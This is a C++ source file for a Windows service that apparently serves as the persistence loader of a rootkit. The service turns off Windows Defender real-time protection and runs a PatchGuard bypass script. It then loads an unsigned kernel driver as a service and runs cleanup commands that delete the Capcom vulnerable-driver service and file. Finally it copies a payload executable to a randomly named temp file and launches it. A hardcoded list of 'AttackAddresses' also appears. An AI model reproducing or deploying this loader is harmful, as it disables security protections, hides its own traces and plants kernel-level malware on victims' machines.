#include <iostream>
#include <sys/types.h>
#include <sys/stat.h>
#include "helpers.h"
#include "utils.h"
#include "services.h"


// Declerations for used functions -
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);  // actual Main() of service, initiates service operations
VOID WINAPI ServiceControlHandler(DWORD);  // controls events, like IRP_MJ_DEVICE_CONTROL in KM
DWORD WINAPI ServiceMainThread(LPVOID lpParam);  // main thread, actually activates the medium service and maps the driver


DWORD WINAPI ServiceMainThread(LPVOID lpParam)
{
    RETURN_LAST LastErrorSpecial = { 0, 0 };
    LogFile InitLog = { 0 };
    struct stat CheckExists = { 0 };
    char MediumName[MAX_PATH] = { 0 };    
    HANDLE MediumFile = INVALID_HANDLE_VALUE;
    HANDLE TempFile = INVALID_HANDLE_VALUE;
    PVOID MediumBuffer = NULL;
    DWORD MediumSize = 0;
    DWORD MediumRead = 0;
    DWORD MediumWritten = 0;
    int LastError = 0;

    char TempPath[MAX_PATH] = { 0 };
    char RandMedium[MAX_PATH] = { 0 };
    const char* CleaningCommands =
        "cd \"%ProgramFiles%\\Windows Defender\" && "
        "MpCmdRun.exe - Restore - All && "
        "sc stop Capcom && "  // REPLACE WITH KDMAPPER USED SERVICE IN LOADING
        "sc delete Capcom && "  // REPLACE WITH KDMAPPER USED SERVICE IN LOADING
        "del %windir%\\Capcom.sys";  // REPLACE WITH KDMAPPER USED SERVICE IN LOADING
    const char* AttackAddresses = "172.18.144.1~172.19.144.1~172.30.48.1~172.23.32.1~172.17.160.1~172.21.0.1~172.24.112.1~192.168.47.1~192.168.5.1~192.168.1.21~172.20.48.1~192.168.56.1";
    
    
    // Make sure that all depended-on files exist on target machine (folders + files) -
    LastError = VerfifyDepDirs();
    if (LastError != 0) {
        return LastError;
    }
    LastError = VerfifyDepFiles();
    if (LastError != 0) {
        return LastError;
    }


    // Enable active log file -
    LastError = (int)InitLog.InitiateFile("C:\\nosusfolder\\verysus\\ServiceLog.txt");
    if (LastError != 0) {
        return FALSE;
    }


    // Disable Realtime Protection -
    LastErrorSpecial = RealTime(TRUE, &InitLog);
    if (LastErrorSpecial.Represent != ERROR_SUCCESS || LastErrorSpecial.LastError != 0) {
        return FALSE;
    }


    // Disable patchguard -
    if (system("C:\\nosusfolder\\verysus\\meowguard\\install.bat") == -1) {
        return SpecialQuit(GetLastError(), "[-] Installing patchguard bypass (meowguard) failed - ", NULL, 0, &InitLog);
    }
    InitLog.WriteLog((PVOID)"[+] Installed patchguard bypass (meowguard) successfully!\n", 59);


    // Activate kdmapper with driver as parameter -
    system("sc stop KmdfDriver");
    system("sc delete KmdfDriver");
    if (system("sc create KmdfDriver type= kernel binPath= \"C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys\" && sc start KmdfDriver") == -1){
    //if (system("C:\\nosusfolder\\verysus\\kdmapper.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys") == -1) {
        return SpecialQuit(GetLastError(), "[-] Failed to activate service manager with driver as parameter - ", NULL, 0, &InitLog);
    }
    InitLog.WriteLog((PVOID)"[+] Activated service manager with driver as a parameter!\n", 59);
    
    
    // Perform cleaning commands -
    if (system(CleaningCommands) == -1) {
        return SpecialQuit(GetLastError(), "[-] Failed to perform cleaning commands - ", NULL, 0, &InitLog);
    }
    InitLog.WriteLog((PVOID)"[+] Performed cleaning commands!\n", 34);


    // Enable Realtime Protection -
    LastErrorSpecial = RealTime(FALSE, &InitLog);
    if (LastErrorSpecial.Represent != ERROR_SUCCESS || LastErrorSpecial.LastError != 0) {
        return FALSE;
    }


    // Get medium handle -
    MediumFile = CreateFileA("C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (MediumFile == INVALID_HANDLE_VALUE) {
        return SpecialQuit(GetLastError(), "[-] Error while trying to read default medium - ", NULL, 0, &InitLog);
    }
    InitLog.WriteLog((PVOID)"[+] Got medium file handle!\n", 36);


    // Get medium data to create a temporary medium file (C:\Windows\Temp) -
    MediumSize = GetFileSize(MediumFile, NULL);
    if (MediumSize == 0) {
        HANDLE CloseArr[1] = { MediumFile };
        return SpecialQuit(GetLastError(), "[-] Failed to get size of medium for creating temp copy - ", CloseArr, 1, &InitLog);
    }
    MediumBuffer = malloc(MediumSize);
    if (MediumBuffer == NULL) {
        HANDLE CloseArr[1] = { MediumFile };
        return SpecialQuit(GetLastError(), "[-] Failed to allocate memory for medium for creating temp copy - ", CloseArr, 1, &InitLog);
    }
    if (!ReadFile(MediumFile, MediumBuffer, MediumSize, &MediumRead, NULL) || MediumRead != MediumSize) {
        HANDLE CloseArr[1] = { MediumFile };
        free(MediumBuffer);
        return SpecialQuit(GetLastError(), "[-] Failed to read medium data into buffer - ", CloseArr, 1, &InitLog);
    }
    CloseHandle(MediumFile);
    InitLog.WriteLog((PVOID)"[+] Got medium data in buffer!\n", 32);


    // Stop and delete existing instance of medium if theres one WITH THE SAME NAME (temp copy of medium) -
    if (stat(TempPath, &CheckExists) == 0) {
        InitLog.WriteLog((PVOID)"[i] Temp copy of medium with the same name already exists!\n", 60);
        GetServiceName(TempPath, MediumName);
        REPLACEMENT Rep = { MediumName, '*', 1 };
        REPLACEMENT RepArr[1] = { Rep };
        LastError = (int)ExecuteSystem("taskkill /IM * /F", RepArr, 1);
        if (LastError != 0) {
            free(MediumBuffer);
            return SpecialQuit(LastError, "[-] Failed to stop existing temp copy of medium - ", NULL, 0, &InitLog);
        }

        Rep = { TempPath, '*', 2 };
        RepArr[0] = Rep;
        LastError = (int)ExecuteSystem("if exist * del /s /q *", RepArr, 1);
        if (LastError != 0) {
            free(MediumBuffer);
            return SpecialQuit(LastError, "[-] Failed to delete existing medium temp copy - ", NULL, 0, &InitLog);
        }
        InitLog.WriteLog((PVOID)"[i] Killed and deleted already existing temp medium copy with the same name as the current!\n", 93);
    }


    // Get path to temp copy of medium file -
    if (GetTempPathA(MAX_PATH, TempPath) == 0) {
        free(MediumBuffer);
        return SpecialQuit(GetLastError(), "[-] Failed to get the temp path of machine for temp medium - ", NULL, 0, &InitLog);
    }
    GetRandomName(RandMedium, 20, ".exe");
    memcpy((PVOID)((ULONG64)TempPath + strlen(TempPath)), RandMedium, strlen(RandMedium) + 1);


    // Make sure that all existing components stop working -
    if (!DeletePrevious(TempPath, &InitLog)) {
        return SpecialQuit(GetLastError(), "[-] DeletePrevious failed - ", NULL, 0, &InitLog);
    }
    InitLog.WriteLog((PVOID)"[+] DeletePrevious succeeded!\n", 31);


    // Create new temp medium instance -
    TempFile = CreateFileA(TempPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (TempFile == INVALID_HANDLE_VALUE) {
        free(MediumBuffer);
        return SpecialQuit(GetLastError(), "[-] Failed to create temp copy of medium - ", NULL, 0, &InitLog);
    }
    if (!WriteFile(TempFile, MediumBuffer, MediumSize, &MediumWritten, NULL) || MediumWritten != MediumSize) {
        HANDLE CloseArr[1] = { TempFile };
        free(MediumBuffer);
        return SpecialQuit(GetLastError(), "[-] Failed to write into new temp copy of medium - ", CloseArr, 1, &InitLog);
    }
    InitLog.WriteLog((PVOID)"[+] Creating new temp copy of medium succeeded!\n", 49);
    free(MediumBuffer);
    CloseHandle(TempFile);


    // Activate medium -
    HINSTANCE MediumProcess = ShellExecuteA(NULL, "open", TempPath, NULL, NULL, SW_NORMAL);
    if ((INT_PTR)MediumProcess > 32) {
        InitLog.WriteLog((PVOID)"[+] Ran medium, overall success!\n", 34);
        InitLog.CloseLog();
        return ERROR_SUCCESS;
    }
    InitLog.WriteError("[-] Failed to run medium process - ", (DWORD)MediumProcess);
    InitLog.CloseLog();
    return (DWORD)MediumProcess;
}


VOID WINAPI ServiceControlHandler(DWORD CtrlCode)
{
    switch (CtrlCode)
    {
    case SERVICE_CONTROL_STOP:

        if (AutomaticService.ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        AutomaticService.ServiceStatus.dwControlsAccepted = 0;
        AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        AutomaticService.ServiceStatus.dwWin32ExitCode = 0;
        AutomaticService.ServiceStatus.dwCheckPoint = 4;

        SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
        SetEvent(AutomaticService.StopEvent);  // Initiate the stop event - main working thread will be notified to stop working
        break;

    default:
        break;  // No need to handle any other type of events
    }
}


VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv)
{
    DWORD Status = E_FAIL;

    // Register the service control handler with the SCM so its possible to control the service -
    AutomaticService.StatusHandle = RegisterServiceCtrlHandler(AutomaticService.ServiceName, ServiceControlHandler);
    if(AutomaticService.StatusHandle != NULL) {
        // Initialize service status with values to show service controller the service is starting -
        RtlZeroMemory(&AutomaticService.ServiceStatus, sizeof(AutomaticService.ServiceStatus));
        AutomaticService.ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
        AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // For now, no interaction with the service is accepted
        AutomaticService.ServiceStatus.dwCurrentState = SERVICE_START_PENDING;  // Intending to eventually start
        AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESS
        AutomaticService.ServiceStatus.dwServiceSpecificExitCode = 0;
        AutomaticService.ServiceStatus.dwCheckPoint = 0;

        if (SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus)) {
            AutomaticService.StopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
            if (AutomaticService.StopEvent == NULL) {
                // Error creating the event that occurs when stopping the service (need to stop service manually) -
                AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // For now, no interaction with the service is accepted
                AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOPPED;  // Service has stopped
                AutomaticService.ServiceStatus.dwWin32ExitCode = GetLastError();
                AutomaticService.ServiceStatus.dwCheckPoint = 1;
                SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
            }
            else {
                // Created stopping event successfully, proceed to start the service -
                AutomaticService.ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;  // Only accepted interaction with service is stopping it
                AutomaticService.ServiceStatus.dwCurrentState = SERVICE_RUNNING;  // Service is currently running
                AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESSFUL
                AutomaticService.ServiceStatus.dwCheckPoint = 0;
                if (SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus)) {
                    AutomaticService.MainThread = CreateThread(NULL, 0, ServiceMainThread, NULL, 0, NULL);
                    if (AutomaticService.MainThread != NULL) {
                        WaitForSingleObject(AutomaticService.MainThread, INFINITE);  // Wait for main thread to stop operating
                    }
                    CloseHandle(AutomaticService.StopEvent);  // Stop event not needed anymore

                    // Update final status of service (stopping after main operation) -
                    AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // No interaction with service should occur when stopping
                    AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOPPED;  // Service has stopped operating
                    AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESS
                    AutomaticService.ServiceStatus.dwCheckPoint = 3;
                    SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
                }
            }
        }
    }
    return;
}


int main(int argc, TCHAR* argv[])
{
    char AutoName[11] = "RootAuto";
    WCHAR WideAutoName[MAX_PATH];
    CharpToWcharp(AutoName, WideAutoName);
    AutomaticService.InitiateService(WideAutoName);
    AutomaticService.ServiceFile = "C:\\nosusfolder\\verysus\\AutoService\\AutoStart.exe";

    // Define the service table entry of the auto service (name, entrypoint ..) -
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {AutomaticService.ServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };


    // Start the service control dispatcher (used by SCM to call the service) -
    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE) {
        return GetLastError();
    }
    return 0;
}